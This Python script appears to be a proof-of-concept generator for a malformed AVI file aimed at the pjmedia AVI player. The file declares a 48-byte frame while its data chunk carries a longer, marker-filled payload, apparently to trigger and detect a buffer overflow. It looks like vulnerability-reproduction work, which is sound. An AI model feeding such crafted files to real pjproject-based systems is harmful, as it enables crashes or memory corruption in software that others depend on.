#!/usr/bin/env python3
"""Synthesize a minimal one-stream DIB AVI for the pjmedia AVI player.

Usage: make_avi.py OUTPUT CHUNK_LEN
Declared frame is 4x4 24-bpp DIB => 48-byte logical frame.  The 00dc
chunk carries CHUNK_LEN bytes, with MISHE-PJPROJECT! at payload offset 48.
"""
import struct
import sys


def u32(value):
    return struct.pack("<I", value)


def tag(text):
    return text.encode("ascii")[:4].ljust(4, b" ")


def build(chunk_len):
    # 4x4 24-bpp DIB: 48 bytes, matching the staged harness's logical frame.
    avih_fields = (
        u32(0)          # usec_per_frame
        + u32(0)        # max bytes/sec
        + u32(0)        # pad
        + u32(0)        # flags
        + u32(1)        # total frames
        + u32(0)        # initial frames
        + u32(1)        # streams
        + u32(48)       # suggested buffer size
        + u32(4)        # width
        + u32(4)        # height
        + b"\0" * 16    # reserved[4]
    )
    assert len(avih_fields) == 56

    strh_fields = (
        tag("vids")     # data type
        + tag("DIB ")   # codec fourcc
        + u32(0)        # flags
        + u32(0)        # priority/language (unused)
        + u32(0)        # initial frames
        + u32(1)        # scale
        + u32(25)       # rate
        + u32(0)        # start
        + u32(1)        # length
        + u32(48)       # buffer size
        + u32(0)        # quality
        + u32(0)        # sample size
        + b"\0" * 8     # bogus_frame[2]
    )
    assert len(strh_fields) == 56

    strf_fields = (
        u32(40) + struct.pack("<ii", 4, 4) + struct.pack("<HH", 1, 24)
        + u32(0) + u32(48) + struct.pack("<ii", 0, 0)
        + u32(0) + u32(0)
    )
    assert len(strf_fields) == 40

    strh = tag("strh") + u32(56) + strh_fields
    strf = tag("strf") + u32(40) + strf_fields
    strl_payload = tag("strl") + strh + strf          # 4 + 64 + 48 = 116
    strl = tag("LIST") + u32(len(strl_payload)) + strl_payload

    hdrl_payload = tag("hdrl") + tag("avih") + u32(56) + avih_fields + strl
    hdrl = tag("LIST") + u32(len(hdrl_payload)) + hdrl_payload
    movi = tag("LIST") + u32(4) + tag("movi")

    marker = b"MISHE-PJPROJECT!"
    payload = bytearray(b"A" * chunk_len)
    if chunk_len > 48:
        for offset in range(48, chunk_len, len(marker)):
            payload[offset:offset + len(marker)] = marker[:chunk_len - offset]

    chunk = tag("00dc") + u32(chunk_len) + bytes(payload)
    if chunk_len & 1:
        chunk += b"\0"

    body = hdrl + movi + chunk
    return tag("RIFF") + u32(len(body) + 4) + tag("AVI ") + body


if __name__ == "__main__":
    path, length = sys.argv[1], int(sys.argv[2])
    if length < 48:
        raise SystemExit("chunk length must be >= 48")
    data = build(length)
    with open(path, "wb") as handle:
        handle.write(data)
    print(f"{path}: {len(data)} bytes, 00dc length {length}")
